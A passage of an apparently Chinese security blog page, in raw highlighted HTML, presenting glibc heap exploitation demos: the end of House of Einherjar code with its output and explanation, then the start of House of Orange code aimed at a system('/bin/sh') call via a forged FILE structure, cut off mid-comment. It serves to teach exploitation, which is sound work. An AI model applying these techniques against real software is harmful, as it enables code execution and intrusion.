</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>size_t</span><span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>a</span><span class=p>[</span><span class=n>real_a_size</span><span class=o>-</span><span class=k>sizeof</span><span class=p>(</span><span class=n>size_t</span><span class=p>)]</span> <span class=o>=</span> <span class=n>fake_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//Change the fake chunk&#39;s size to reflect b&#39;s new prev_size
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Modify fake chunk&#39;s size to reflect b&#39;s new prev_size</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>fake_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// free b and it will consolidate with our fake chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Our fake chunk size is now %#lx (b.size + fake_prev_size)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>fake_chunk</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//if we allocate another chunk before we free b we will need to
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//do two things:
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//1) We will need to adjust the size of our fake chunk so that
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//fake_chunk + fake_chunk&#39;s size points to an area we control
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//2) we will need to write the size of our fake chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//at the location we control.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//After doing these two things, when unlink gets called, our fake chunk will
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//pass the size(P) == prev_size(next_chunk(P)) test.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//otherwise we need to make sure that our fake chunk is up against the
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//wilderness
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now we can call malloc() and it will begin in our fake chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x200</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Next malloc(0x200) is at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>d</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Welcome to House of Einherjar!
</span></span><span class=line><span class=cl>Tested in Ubuntu 16.04 64bit.
</span></span><span class=line><span class=cl>This technique can be used when you have an off-by-one into a malloc&#39;ed region with a null byte.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We allocate 0x38 bytes for &#39;a&#39;
</span></span><span class=line><span class=cl>a: 0x1cc0010
</span></span><span class=line><span class=cl>Since we want to overflow &#39;a&#39;, we need the &#39;real&#39; size of &#39;a&#39; after rounding: 0x38
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We create a fake chunk wherever we want, in this case we&#39;ll create the chunk on the stack
</span></span><span class=line><span class=cl>However, you can also create the chunk in the heap or the bss, as long as you know its address
</span></span><span class=line><span class=cl>We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks
</span></span><span class=line><span class=cl>(although we could do the unsafe unlink technique here in some scenarios)
</span></span><span class=line><span class=cl>Our fake chunk at 0x7fffd1743240 looks like:
</span></span><span class=line><span class=cl>prev_size (not used): 0x100
</span></span><span class=line><span class=cl>size: 0x100
</span></span><span class=line><span class=cl>fwd: 0x7fffd1743240
</span></span><span class=line><span class=cl>bck: 0x7fffd1743240
</span></span><span class=line><span class=cl>fwd_nextsize: 0x7fffd1743240
</span></span><span class=line><span class=cl>bck_nextsize: 0x7fffd1743240
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We allocate 0xf8 bytes for &#39;b&#39;.
</span></span><span class=line><span class=cl>b: 0x1cc0050
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>b.size: 0x101
</span></span><span class=line><span class=cl>b.size is: (0x100) | prev_inuse = 0x101
</span></span><span class=line><span class=cl>We overflow &#39;a&#39; with a single null byte into the metadata of &#39;b&#39;
</span></span><span class=line><span class=cl>b.size: 0x100
</span></span><span class=line><span class=cl>This is easiest if b.size is a multiple of 0x100 so you don&#39;t change the size of b, only its prev_inuse bit
</span></span><span class=line><span class=cl>If it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunk
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>We write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunk
</span></span><span class=line><span class=cl>Our fake prev_size will be 0x1cc0040 - 0x7fffd1743240 = 0xffff80003057ce00
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Modify fake chunk&#39;s size to reflect b&#39;s new prev_size
</span></span><span class=line><span class=cl>Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
</span></span><span class=line><span class=cl>Our fake chunk size is now 0xffff80003059ddc1 (b.size + fake_prev_size)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now we can call malloc() and it will begin in our fake chunk
</span></span><span class=line><span class=cl>Next malloc(0x200) is at 0x7fffd1743250
</span></span></code></pre></td></tr></table></div></div><p>这个利用方式基于 off-by-null，首先伪造 chunk，使其 <code>fd,bk,fd_nextsize,bk_nextsize</code> 均指向自身以绕过 unlink 检查。然后申请大小以 <code>8</code> 结尾的 chunk <code>a</code>，以及实际大小以 <code>0</code> 结尾的 chunk <code>b</code>，这样从 <code>a</code> 溢出时仅仅修改了 <code>b</code> 的 <code>PREV_INUSE</code> 位，同时 <code>a</code> 还能伪造 <code>b</code> 的 <code>prev_size</code> 字段。</p><p>我们将 <code>b</code> 的 <code>prev_size</code> 设置为 <code>b</code> 的 chunk 指针地址减去 fake chunk 的 chunk 指针地址，对 fake chunk 的 <code>size</code> 字段也作相应修改，那么释放 <code>b</code> 时就会和 fake chunk 合并，下次再申请时就能拿到 fake chunk 了。</p><h2 id=house_of_orange>house_of_orange</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
</span></span></span><span class=line><span class=cl><span class=cm>  It requires a leak of the heap and the libc
</span></span></span><span class=line><span class=cl><span class=cm>  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>   This function is just present to emulate the scenario where
</span></span></span><span class=line><span class=cl><span class=cm>   the address of the function system is known.
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>winner</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>ptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      The House of Orange starts with the assumption that a buffer overflow exists on the heap
</span></span></span><span class=line><span class=cl><span class=cm>      using which the Top (also called the Wilderness) chunk can be corrupted.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      At the beginning of execution, the entire heap is part of the Top chunk.
</span></span></span><span class=line><span class=cl><span class=cm>      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
</span></span></span><span class=line><span class=cl><span class=cm>      Thus, with every allocation, the Top chunks keeps getting smaller.
</span></span></span><span class=line><span class=cl><span class=cm>      And in a situation where the size of the Top chunk is smaller than the requested value,
</span></span></span><span class=line><span class=cl><span class=cm>      there are two possibilities:
</span></span></span><span class=line><span class=cl><span class=cm>       1) Extend the Top chunk
</span></span></span><span class=line><span class=cl><span class=cm>       2) Mmap a new page
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      If the size requested is smaller than 0x21000, then the former is followed.
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>p1</span><span class=p>,</span> <span class=o>*</span><span class=n>p2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>size_t</span> <span class=n>io_list_all</span><span class=p>,</span> <span class=o>*</span><span class=n>top</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&#34;</span>
</span></span><span class=line><span class=cl>        <span class=s>&#34;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      Firstly, lets allocate a chunk on the heap.
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x400</span><span class=o>-</span><span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>       The heap is usually allocated with a top chunk of size 0x21000
</span></span></span><span class=line><span class=cl><span class=cm>       Since we&#39;ve allocate a chunk of size 0x400 already,
</span></span></span><span class=line><span class=cl><span class=cm>       what&#39;s left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
</span></span></span><span class=line><span class=cl><span class=cm>       it must also be page aligned at the end.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       Also, if a chunk that is adjacent to the Top chunk is to be freed,
</span></span></span><span class=line><span class=cl><span class=cm>       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       So that means that there are two conditions that must always be true.
</span></span></span><span class=line><span class=cl><span class=cm>        1) Top chunk + size has to be page aligned
</span></span></span><span class=line><span class=cl><span class=cm>        2) Top chunk&#39;s prev_inuse bit has to be set.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
</span></span></span><span class=line><span class=cl><span class=cm>       What&#39;s left is 0x20c01
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       Now, let&#39;s satisfy the conditions
</span></span></span><span class=line><span class=cl><span class=cm>       1) Top chunk + size has to be page aligned
</span></span></span><span class=line><span class=cl><span class=cm>       2) Top chunk&#39;s prev_inuse bit has to be set.
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>top</span> <span class=o>=</span> <span class=p>(</span><span class=n>size_t</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=n>p1</span> <span class=o>+</span> <span class=mh>0x400</span> <span class=o>-</span> <span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>top</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xc01</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>       Now we request a chunk of size larger than the size of the Top chunk.
</span></span></span><span class=line><span class=cl><span class=cm>       Malloc tries to service this request by extending the Top chunk
</span></span></span><span class=line><span class=cl><span class=cm>       This forces sysmalloc to be invoked.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       In the usual scenario, the heap looks like the following
</span></span></span><span class=line><span class=cl><span class=cm>          |------------|------------|------...----|
</span></span></span><span class=line><span class=cl><span class=cm>          |    chunk   |    chunk   | Top  ...    |
</span></span></span><span class=line><span class=cl><span class=cm>          |------------|------------|------...----|
</span></span></span><span class=line><span class=cl><span class=cm>      heap start                              heap end
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       And the new area that gets allocated is contiguous to the old heap end.
</span></span></span><span class=line><span class=cl><span class=cm>       So the new size of the Top chunk is the sum of the old size and the newly allocated size.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       In order to keep track of this change in size, malloc uses a fencepost chunk,
</span></span></span><span class=line><span class=cl><span class=cm>       which is basically a temporary chunk.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       After the size of the Top chunk has been updated, this chunk gets freed.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       In our scenario however, the heap looks like
</span></span></span><span class=line><span class=cl><span class=cm>          |------------|------------|------..--|--...--|---------|
</span></span></span><span class=line><span class=cl><span class=cm>          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
</span></span></span><span class=line><span class=cl><span class=cm>          |------------|------------|------..--|--...--|---------|
</span></span></span><span class=line><span class=cl><span class=cm>     heap start                            heap end
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
</span></span></span><span class=line><span class=cl><span class=cm>       So the area between the second chunk and the heap end is unused.
</span></span></span><span class=line><span class=cl><span class=cm>       And the old Top chunk gets freed.
</span></span></span><span class=line><span class=cl><span class=cm>       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
</span></span></span><span class=line><span class=cl><span class=cm>       it gets added to list of unsorted bins.
</span></span></span><span class=line><span class=cl><span class=cm>       Now we request a chunk of size larger than the size of the top chunk.
</span></span></span><span class=line><span class=cl><span class=cm>       This forces sysmalloc to be invoked.
</span></span></span><span class=line><span class=cl><span class=cm>       And ultimately invokes _int_free
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>       Finally the heap looks like this:
</span></span></span><span class=line><span class=cl><span class=cm>          |------------|------------|------..--|--...--|---------|
</span></span></span><span class=line><span class=cl><span class=cm>          |    chunk   |    chunk   | free ..  |  ...  | new Top |
</span></span></span><span class=line><span class=cl><span class=cm>          |------------|------------|------..--|--...--|---------|
</span></span></span><span class=line><span class=cl><span class=cm>     heap start                                             new heap end
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      Note that the above chunk will be allocated in a different page
</span></span></span><span class=line><span class=cl><span class=cm>      that gets mmapped. It will be placed after the old heap&#39;s end
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      Here starts phase two of the attack. We assume that we have an overflow into the old
</span></span></span><span class=line><span class=cl><span class=cm>      top chunk so we could overwrite the chunk&#39;s size.
</span></span></span><span class=line><span class=cl><span class=cm>      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
</span></span></span><span class=line><span class=cl><span class=cm>      of this chunk in the unsorted bin list.
</span></span></span><span class=line><span class=cl><span class=cm>      There are two common ways to exploit the current state:
</span></span></span><span class=line><span class=cl><span class=cm>        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
</span></span></span><span class=line><span class=cl><span class=cm>        - Use the unlinking of the chunk for an *where*-controlled write of the
</span></span></span><span class=line><span class=cl><span class=cm>          libc&#39;s main_arena unsorted-bin-list. (requires at least one allocation)
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      The former attack is pretty straight forward to exploit, so we will only elaborate
</span></span></span><span class=line><span class=cl><span class=cm>      on a variant of the latter, developed by Angelboy in the blog post linked above.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      The attack is pretty stunning, as it exploits the abort call itself, which
</span></span></span><span class=line><span class=cl><span class=cm>      is triggered when the libc detects any bogus state of the heap.
</span></span></span><span class=line><span class=cl><span class=cm>      Whenever abort is triggered, it will flush all the file pointers by calling
</span></span></span><span class=line><span class=cl><span class=cm>      _IO_flush_all_lockp. Eventually, walking through the linked list in
</span></span></span><span class=line><span class=cl><span class=cm>      _IO_list_all and calling _IO_OVERFLOW on them.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
</span></span></span><span class=line><span class=cl><span class=cm>      _IO_OVERLOW points to system and whose first 8 bytes are set to &#39;/bin/sh&#39;, so
</span></span></span><span class=line><span class=cl><span class=cm>      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#39;/bin/sh&#39;).
</span></span></span><span class=line><span class=cl><span class=cm>      More about file-pointer exploitation can be found here:
</span></span></span><span class=line><span class=cl><span class=cm>      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
</span></span></span><span class=line><span class=cl><span class=cm>      currently point to the libc&#39;s main_arena.
</span></span></span><span class=line><span class=cl><span class=cm>    */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>io_list_all</span> <span class=o>=</span> <span class=n>top</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>+</span> <span class=mh>0x9a8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>      We plan to overwrite the fd and bk pointers of the old top,
</span></span></span><span class=line><span class=cl><span class=cm>      which has now been added to the unsorted bins.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>      When malloc tries to satisfy a request by splitting this free chunk
</span></span></span><span class=line><span class=cl><span class=cm>      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list
</span></span></span><span class=line><span class=cl><span class=cm>      in libc&#39;s main_arena.
